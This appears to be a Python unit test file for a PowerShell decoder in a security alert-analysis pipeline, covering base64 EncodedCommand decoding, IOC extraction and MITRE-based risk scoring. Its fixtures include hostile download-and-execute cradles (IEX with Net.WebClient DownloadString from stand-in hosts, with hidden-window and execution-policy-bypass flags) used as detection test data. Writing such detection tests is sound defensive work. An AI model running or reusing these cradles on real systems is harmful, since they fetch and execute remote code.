"""Unit tests for agents/parsing/powershell_decoder.py.

Covers detection/decoding of a PowerShell -EncodedCommand payload, IOC
extraction from decoded text, suspicious-behaviour/MITRE mapping, and the
end-to-end analyse_powershell_command_lines() entry point that
agents/parsing/parser_normaliser.py::normalise_alert_record() calls
directly (see PARSER_VERSION section of that file)."""
from __future__ import annotations

import base64

from agents.parsing.powershell_decoder import (
    analyse_decoded_powershell,
    analyse_powershell_command_lines,
    decode_powershell_encoded_command,
    extract_encoded_command,
    extract_iocs_from_powershell,
)


def _encode(command: str) -> str:
    return base64.b64encode(command.encode("utf-16le")).decode()


MALICIOUS_COMMAND = (
    "IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')"
)


def test_extract_encoded_command_finds_dash_enc_flag():
    encoded = _encode(MALICIOUS_COMMAND)
    line = f"powershell.exe -nop -w hidden -enc {encoded}"
    found = extract_encoded_command(line)
    assert found is not None
    # Base64-normalised (padded), same payload either way.
    assert found.replace("=", "") == encoded.replace("=", "")


def test_extract_encoded_command_returns_none_for_plain_command():
    assert extract_encoded_command("powershell.exe -Command Get-Process") is None
    assert extract_encoded_command("") is None


def test_decode_powershell_encoded_command_round_trips_utf16le():
    encoded = _encode(MALICIOUS_COMMAND)
    decoded = decode_powershell_encoded_command(encoded)
    assert decoded["decode_status"] == "success"
    assert decoded["decoded_command"] == MALICIOUS_COMMAND
    assert decoded["encoding_detected"] == "utf-16le"


def test_decode_powershell_encoded_command_handles_invalid_base64():
    decoded = decode_powershell_encoded_command("not-valid-base64!!!")
    assert decoded["decode_status"] == "failed"
    assert decoded["decoded_command"] == ""


def test_decode_powershell_encoded_command_handles_empty_input():
    decoded = decode_powershell_encoded_command("")
    assert decoded["decode_status"] == "not_present"


def test_extract_iocs_from_powershell_finds_url_domain_and_public_ip():
    text = (
        f"{MALICIOUS_COMMAND} contact-ip:93.184.216.34 "
        "drop-file:payload.exe hash:d41d8cd98f00b204e9800998ecf8427e"
    )
    iocs = extract_iocs_from_powershell(text)
    assert "http://malicious.example.com/payload.ps1" in iocs["urls"]
    assert "malicious.example.com" in iocs["domains"]
    assert "93.184.216.34" in iocs["public_ips"]
    assert "payload.exe" in iocs["file_names"]
    assert "d41d8cd98f00b204e9800998ecf8427e" in iocs["hashes"]


def test_extract_iocs_from_powershell_excludes_private_ips():
    iocs = extract_iocs_from_powershell("connect to 10.0.0.5 and 192.168.1.1")
    assert iocs["public_ips"] == []


def test_analyse_decoded_powershell_flags_download_and_execution_policy_bypass():
    analysis = analyse_decoded_powershell(
        "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "
        "\"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/x')\""
    )
    behaviour_names = {b["behaviour"] for b in analysis["suspicious_behaviours"]}
    assert "Execution policy bypass" in behaviour_names
    assert "Hidden PowerShell window" in behaviour_names
    assert "In-memory execution" in behaviour_names
    assert "Remote payload download" in behaviour_names
    mitre_ids = {m["technique_id"] for m in analysis["mitre_mapping"]}
    assert "T1059.001" in mitre_ids
    assert analysis["risk_assessment"]["risk_level"] in {"High", "Critical"}


def test_analyse_decoded_powershell_benign_command_is_low_risk():
    analysis = analyse_decoded_powershell("Get-Process | Select-Object Name")
    assert analysis["suspicious_behaviours"] == []
    assert analysis["risk_assessment"]["risk_level"] == "Low"
    assert analysis["risk_assessment"]["risk_score"] == 0


def test_analyse_powershell_command_lines_end_to_end_with_encoded_command():
    encoded = _encode(MALICIOUS_COMMAND)
    command_lines = [f"powershell.exe -nop -w hidden -enc {encoded}"]
    result = analyse_powershell_command_lines(command_lines, alert_text="PowerShell alert")

    assert result["encoded_command_present"] is True
    assert result["powershell_indicator_present"] is True
    assert result["decode_status"] == "success"
    assert result["decoded_command_count"] == 1
    assert MALICIOUS_COMMAND in result["decoded_commands"]
    assert "malicious.example.com" in result["extracted_iocs"]["domains"]
    assert result["decoded_command_summary"] != (
        "No decodable PowerShell EncodedCommand content was available in the parsed telemetry."
    )


def test_analyse_powershell_command_lines_no_encoded_command_present():
    # This is the intended "nothing to decode" behaviour -- not a case that
    # should be forced into fabricating PowerShell analysis.
    result = analyse_powershell_command_lines(["cmd.exe /c dir"], alert_text="")
    assert result["encoded_command_present"] is False
    assert result["decode_status"] == "not_found"
    assert result["decoded_commands"] == []
    assert result["extracted_iocs"] == {
        "urls": [], "domains": [], "public_ips": [], "hashes": [], "file_paths": [], "file_names": [],
    }
    assert result["decoded_command_summary"] == (
        "No decodable PowerShell EncodedCommand content was available in the parsed telemetry."
    )


def test_analyse_powershell_command_lines_handles_empty_input():
    result = analyse_powershell_command_lines([], alert_text="")
    assert result["encoded_command_present"] is False
    assert result["powershell_indicator_present"] is False
    assert result["decode_status"] == "not_found"
